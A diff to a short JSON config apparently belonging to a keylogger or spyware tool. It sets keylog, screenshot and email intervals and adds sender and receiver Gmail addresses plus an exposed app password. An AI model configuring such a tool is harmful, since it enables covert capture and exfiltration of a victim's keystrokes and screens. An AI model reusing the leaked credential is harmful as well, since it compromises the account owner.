@@ -1,5 +1,8 @@
 {
     "email_interval": 35,
     "screenshot_interval": 35,
-    "keylog_interval": 5
+    "keylog_interval": 5,
+    "sender_mail": "rajmahimaurya@gmail.com",
+    "sender_password": "txsm fiuk goan bplx",
+    "receiver_mail": "syntaxajju@gmail.com"
 }
